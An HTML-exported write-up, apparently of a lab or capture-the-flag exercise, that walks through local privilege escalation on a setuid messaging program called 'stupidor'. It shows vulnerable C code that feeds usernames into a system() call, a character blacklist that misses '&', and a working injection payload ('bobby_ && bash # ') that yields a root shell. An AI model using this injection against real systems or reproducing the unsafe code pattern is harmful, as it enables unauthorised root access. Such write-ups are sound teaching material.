<!DOCTYPE html>
<html>
<head>
<title>Report.md</title>
<meta http-equiv="Content-type" content="text/html;charset=UTF-8">

<style>
/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

body {
	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
	font-size: var(--vscode-markdown-font-size, 14px);
	padding: 0 26px;
	line-height: var(--vscode-markdown-line-height, 22px);
	word-wrap: break-word;
}

#code-csp-warning {
	position: fixed;
	top: 0;
	right: 0;
	color: white;
	margin: 16px;
	text-align: center;
	font-size: 12px;
	font-family: sans-serif;
	background-color:#444444;
	cursor: pointer;
	padding: 6px;
	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
}

#code-csp-warning:hover {
	text-decoration: none;
	background-color:#007acc;
	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
}

body.scrollBeyondLastLine {
	margin-bottom: calc(100vh - 22px);
}

body.showEditorSelection .code-line {
	position: relative;
}

body.showEditorSelection .code-active-line:before,
body.showEditorSelection .code-line:hover:before {
	content: "";
	display: block;
	position: absolute;
	top: 0;
	left: -12px;
	height: 100%;
}

body.showEditorSelection li.code-active-line:before,
body.showEditorSelection li.code-line:hover:before {
	left: -30px;
}

.vscode-light.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(0, 0, 0, 0.15);
}

.vscode-light.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(0, 0, 0, 0.40);
}

.vscode-light.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

.vscode-dark.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(255, 255, 255, 0.4);
}

.vscode-dark.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(255, 255, 255, 0.60);
}

.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

.vscode-high-contrast.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(255, 160, 0, 0.7);
}

.vscode-high-contrast.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(255, 160, 0, 1);
}

.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

img {
	max-width: 100%;
	max-height: 100%;
}

a {
	text-decoration: none;
}

a:hover {
	text-decoration: underline;
}

a:focus,
input:focus,
select:focus,
textarea:focus {
	outline: 1px solid -webkit-focus-ring-color;
	outline-offset: -1px;
}

hr {
	border: 0;
	height: 2px;
	border-bottom: 2px solid;
}

h1 {
	padding-bottom: 0.3em;
	line-height: 1.2;
	border-bottom-width: 1px;
	border-bottom-style: solid;
}

h1, h2, h3 {
	font-weight: normal;
}

table {
	border-collapse: collapse;
}

table > thead > tr > th {
	text-align: left;
	border-bottom: 1px solid;
}

table > thead > tr > th,
table > thead > tr > td,
table > tbody > tr > th,
table > tbody > tr > td {
	padding: 5px 10px;
}

table > tbody > tr + tr > td {
	border-top: 1px solid;
}

blockquote {
	margin: 0 7px 0 5px;
	padding: 0 16px 0 10px;
	border-left-width: 5px;
	border-left-style: solid;
}

code {
	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
	font-size: 1em;
	line-height: 1.357em;
}

body.wordWrap pre {
	white-space: pre-wrap;
}

pre:not(.hljs),
pre.hljs code > div {
	padding: 16px;
	border-radius: 3px;
	overflow: auto;
}

pre code {
	color: var(--vscode-editor-foreground);
	tab-size: 4;
}

/** Theming */

.vscode-light pre {
	background-color: rgba(220, 220, 220, 0.4);
}

.vscode-dark pre {
	background-color: rgba(10, 10, 10, 0.4);
}

.vscode-high-contrast pre {
	background-color: rgb(0, 0, 0);
}

.vscode-high-contrast h1 {
	border-color: rgb(0, 0, 0);
}

.vscode-light table > thead > tr > th {
	border-color: rgba(0, 0, 0, 0.69);
}

.vscode-dark table > thead > tr > th {
	border-color: rgba(255, 255, 255, 0.69);
}

.vscode-light h1,
.vscode-light hr,
.vscode-light table > tbody > tr + tr > td {
	border-color: rgba(0, 0, 0, 0.18);
}

.vscode-dark h1,
.vscode-dark hr,
.vscode-dark table > tbody > tr + tr > td {
	border-color: rgba(255, 255, 255, 0.18);
}

</style>

<style>
/* Tomorrow Theme */
/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
/* Original theme - https://github.com/chriskempson/tomorrow-theme */

/* Tomorrow Comment */
.hljs-comment,
.hljs-quote {
	color: #8e908c;
}

/* Tomorrow Red */
.hljs-variable,
.hljs-template-variable,
.hljs-tag,
.hljs-name,
.hljs-selector-id,
.hljs-selector-class,
.hljs-regexp,
.hljs-deletion {
	color: #c82829;
}

/* Tomorrow Orange */
.hljs-number,
.hljs-built_in,
.hljs-builtin-name,
.hljs-literal,
.hljs-type,
.hljs-params,
.hljs-meta,
.hljs-link {
	color: #f5871f;
}

/* Tomorrow Yellow */
.hljs-attribute {
	color: #eab700;
}

/* Tomorrow Green */
.hljs-string,
.hljs-symbol,
.hljs-bullet,
.hljs-addition {
	color: #718c00;
}

/* Tomorrow Blue */
.hljs-title,
.hljs-section {
	color: #4271ae;
}

/* Tomorrow Purple */
.hljs-keyword,
.hljs-selector-tag {
	color: #8959a8;
}

.hljs {
	display: block;
	overflow-x: auto;
	color: #4d4d4c;
	padding: 0.5em;
}

.hljs-emphasis {
	font-style: italic;
}

.hljs-strong {
	font-weight: bold;
}
</style>

<style>
/*
 * Markdown PDF CSS
 */

 body {
	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
	padding: 0 12px;
}

pre {
	background-color: #f8f8f8;
	border: 1px solid #cccccc;
	border-radius: 3px;
	overflow-x: auto;
	white-space: pre-wrap;
	overflow-wrap: break-word;
}

pre:not(.hljs) {
	padding: 23px;
	line-height: 19px;
}

blockquote {
	background: rgba(127, 127, 127, 0.1);
	border-color: rgba(0, 122, 204, 0.5);
}

.emoji {
	height: 1.4em;
}

code {
	font-size: 14px;
	line-height: 19px;
}

/* for inline code */
:not(pre):not(.hljs) > code {
	color: #C9AE75; /* Change the old color so it seems less like an error */
	font-size: inherit;
}

/* Page Break : use <div class="page"/> to insert page break
-------------------------------------------------------- */
.page {
	page-break-after: always;
}

</style>

<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
</head>
<body>
  <script>
    mermaid.initialize({
      startOnLoad: true,
      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
          ? 'dark'
          : 'default'
    });
  </script>
<h1 id="stupidor-vulnerability"><code>stupidor</code> vulnerability</h1>
<p>Once we obtained local access to the server, we first check what user we're logged in as:</p>
<pre class="hljs"><code><div>karen@ubuntu-server:~$ whoami
karen
</div></code></pre>
<p>We then check if we have sudo rights:</p>
<pre class="hljs"><code><div>karen@ubuntu-server:~$ sudo -l
[sudo] password for karen: 
Sorry, user karen may not run sudo on ubuntu-server
</div></code></pre>
<p>We also check the groups of which we're a member:</p>
<pre class="hljs"><code><div>karen@ubuntu-server:~$ id
uid=1001(karen) gid=1001(karen) groups=1001(karen)
</div></code></pre>
<p>Well, this user is quite useless... or is it? We look around the user's directories and find a file <code>reminder.txt</code> in the Desktop. Let's read it:</p>
<pre class="hljs"><code><div>karen@ubuntu-server:~$ cat reminder.txt 
April 23, 2024

Η ημερομηνία κυκλοφορίας του Stupidor είναι τον Ιούλιο, οπότε έχω ακόμα χρόνο. 
Τέλος πάντων, πρέπει να θυμηθώ να ελέγξω ξανά τα εισερχόμενα. Λένε ότι είναι 
ευάλωτο, αν και δεν καταλαβαίνω πώς. Δεν ξέρω, θα το δω εν ευθέτω χρόνω.
</div></code></pre>
<p>D:</p>
<p>Ok, let's try translating this:</p>
<p><em>The release date for Stupidor is in July, so I still have time. Anyway, I need to remember to check my inbox again. They say it's vulnerable, though I don't understand how. I don't know, I'll look into it in due course.</em></p>
<p>Seems like they're talking about some software called Stupidor. Their inbox what? Is it bad translation? Anyway, I like the 'vulnerable' word. Maybe this has something to do with Stupidor.</p>
<pre class="hljs"><code><div>karen@ubuntu-server:~$ stupidor
Usage:
    stupidor [command]

Available commands:
    signup      Sign up
    send        Send a message
    inbox       Check inbox

Flags:
    -h, --help      Show this help info
    -v, --version   Show version info

Use &quot;stupidor [command] --help&quot; for more information about a command.
</div></code></pre>
<p>Ah-ah! So the inbox (and probably the vulnerability) they were talking about concerns this program. Let's dive a little more into it.</p>
<pre class="hljs"><code><div>karen@ubuntu-server:~$ which stupidor
/usr/local/bin/stupidor
karen@ubuntu-server:~$ ls -l /usr/local/bin/stupidor
-rwsr-xr-x 1 root root 27104 Apr 20 15:27 /usr/local/bin/stupidor*
</div></code></pre>
<p>Well, this is real nice! I smell privilege escalation here. So, the next step is to understand how to break this program so to earn root privileges.</p>
<p><em>... plays with Stupidor to look for easy-to-exploit vulnerabilities, but nothing interesting is found...</em></p>
<p>Ok. What can I do now? In the reminder, Karen talked about having to check the inbox again before the release date. Maybe this means that the source code is still accessible. Let's see...</p>
<pre class="hljs"><code><div>karen@ubuntu-server:~$ find / -name stupidor 2&gt;/dev/null
/var/stupidor
/usr/share/doc/stupidor
/usr/local/src/stupidor
karen@ubuntu-server:~$ ls -l /usr/local/src/stupidor
total 56
-rw-r--r-- 1 root root 1032 Apr 20 15:44 check_password.c
-rw-r--r-- 1 root root  542 Apr 20 15:44 check_username.c
-rw-r--r-- 1 root root 1807 Apr 20 15:44 defines.h
-rw-r--r-- 1 root root  630 Apr 20 15:44 generate_seed.c
-rw-r--r-- 1 root root 1138 Apr 20 15:44 get_hash.c
-rw-r--r-- 1 root root  310 Apr 20 15:44 includes.h
-rw-r--r-- 1 root root  332 Apr 20 15:44 print_file.c
-rw-r--r-- 1 root root 5263 Apr 20 15:44 sha256.c
-rw-r--r-- 1 root root 1215 Apr 20 15:44 sha256.h
-rw-r--r-- 1 root root 1766 Apr 20 15:44 stupidor.c
-rw-r--r-- 1 root root 2282 Apr 20 15:44 stupidor_inbox.c
-rw-r--r-- 1 root root 2620 Apr 20 15:44 stupidor_send.c
-rw-r--r-- 1 root root 4082 Apr 20 15:44 stupidor_signup.c
</div></code></pre>
<p>Good! We cannot change it but at least we can read it. Apparently there is a vulnerability in the part concerning the inbox. Let's dive into it:</p>
<pre class="hljs"><code><div><span class="hljs-comment">/*
Check inbox

Usage:
    stupidor inbox

Flags:
    -h, --help          Show this help info
    -D, --delete-all    Delete all messages in the inbox
*/</span>

<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"includes.h"</span></span>

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">stupidor_inbox</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-keyword">delete</span>)</span>
</span>{
    <span class="hljs-keyword">char</span> username[UNAMEMAX];

[...]

<span class="hljs-comment">/* read inbox */</span>
    <span class="hljs-keyword">char</span> filepath[PATH_MAX];
    <span class="hljs-built_in">snprintf</span>(filepath, <span class="hljs-keyword">sizeof</span>(filepath), <span class="hljs-string">"/var/stupidor/_%s_"</span>, username);
    <span class="hljs-keyword">char</span> command[<span class="hljs-built_in">strlen</span>(filepath) + <span class="hljs-number">10</span>]; <span class="hljs-comment">// 10 = "sudo cat " + '\0'</span>
    <span class="hljs-built_in">snprintf</span>(command, <span class="hljs-keyword">sizeof</span>(command), <span class="hljs-string">"sudo cat %s"</span>, filepath);
    system(command);
    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);
}
</div></code></pre>
<p>Here's something interesting: reading the inbox consists in reading a file named as the associated user, with a starting and ending underscore. To read the file, the program runs <code>sudo cat /var/stupidor/_&lt;username&gt;_</code>. Well, here I see the opportunity of a command injection. I just have to create a new user with a malicious username.</p>
<p>Ehy, I just have to create a user called <code>; bash</code>, then I check the inbox and that's it!</p>
<pre class="hljs"><code><div>karen@ubuntu-server:~$ stupidor signup
Enter username: ; bash
Username can't contain './'&quot;+:;*&amp;|&gt;^$\()[]{}'.
</div></code></pre>
<p>D:</p>
<p>How am I supposed to do this then?</p>
<p><em>time passes, and the desperate hacker does not understand what to do. He then begins to read the program's source code in search of some ideas, until he notices something...</em></p>
<pre class="hljs"><code><div>karen@ubuntu-server:~$ cat /usr/local/src/stupidor/stupidor_signup.c
</div></code></pre>
<pre class="hljs"><code><div>[...]

    <span class="hljs-comment">/* illegal characters */</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strchr</span>(username, <span class="hljs-string">'.'</span>)  != <span class="hljs-literal">NULL</span> || 
        <span class="hljs-built_in">strchr</span>(username, <span class="hljs-string">'/'</span>)  != <span class="hljs-literal">NULL</span> ||
        <span class="hljs-built_in">strchr</span>(username, <span class="hljs-string">'\''</span>) != <span class="hljs-literal">NULL</span> ||
        <span class="hljs-built_in">strchr</span>(username, <span class="hljs-string">'\"'</span>) != <span class="hljs-literal">NULL</span> ||
        <span class="hljs-built_in">strchr</span>(username, <span class="hljs-string">'+'</span>)  != <span class="hljs-literal">NULL</span> ||
        <span class="hljs-built_in">strchr</span>(username, <span class="hljs-string">':'</span>)  != <span class="hljs-literal">NULL</span> ||
        <span class="hljs-built_in">strchr</span>(username, <span class="hljs-string">';'</span>)  != <span class="hljs-literal">NULL</span> ||
        <span class="hljs-built_in">strchr</span>(username, <span class="hljs-string">'*'</span>)  != <span class="hljs-literal">NULL</span> ||
        <span class="hljs-built_in">strchr</span>(username, <span class="hljs-string">'|'</span>)  != <span class="hljs-literal">NULL</span> ||
        <span class="hljs-built_in">strchr</span>(username, <span class="hljs-string">'&gt;'</span>)  != <span class="hljs-literal">NULL</span> ||
        <span class="hljs-built_in">strchr</span>(username, <span class="hljs-string">'^'</span>)  != <span class="hljs-literal">NULL</span> ||
        <span class="hljs-built_in">strchr</span>(username, <span class="hljs-string">'$'</span>)  != <span class="hljs-literal">NULL</span> ||
        <span class="hljs-built_in">strchr</span>(username, <span class="hljs-string">'\\'</span>) != <span class="hljs-literal">NULL</span> ||
        <span class="hljs-built_in">strchr</span>(username, <span class="hljs-string">'('</span>)  != <span class="hljs-literal">NULL</span> ||
        <span class="hljs-built_in">strchr</span>(username, <span class="hljs-string">')'</span>)  != <span class="hljs-literal">NULL</span> ||
        <span class="hljs-built_in">strchr</span>(username, <span class="hljs-string">'['</span>)  != <span class="hljs-literal">NULL</span> ||
        <span class="hljs-built_in">strchr</span>(username, <span class="hljs-string">']'</span>)  != <span class="hljs-literal">NULL</span> ||
        <span class="hljs-built_in">strchr</span>(username, <span class="hljs-string">'{'</span>)  != <span class="hljs-literal">NULL</span> ||
        <span class="hljs-built_in">strchr</span>(username, <span class="hljs-string">'}'</span>)  != <span class="hljs-literal">NULL</span>) {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Username can't contain './\'\"+:;*&amp;|&gt;^$\\()[]{}'.\n"</span>);
        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);
    }

[...]
</div></code></pre>
<p>They forgot to check for the occurrence of '&amp;' characters! So I can do something like <code>cat /var/stupidor/_&lt;existing user&gt;_ &amp;&amp; bash # _</code> and obatin a root shell! Let's try:</p>
<pre class="hljs"><code><div>karen@ubuntu-server:~$ stupidor signup
Enter username: bobby
Enter password: 12345678
User created.
karen@ubuntu-server:~$ stupidor signup
Enter username: bobby_ &amp;&amp; bash # 
Enter password: 12345678
User created.
karen@ubuntu-server:~$ stupidor inbox
Username: bobby_ &amp;&amp; bash # 
Password: 12345678
root@ubuntu-server:~# 
</div></code></pre>
<p>Gotcha!</p>

</body>
</html>
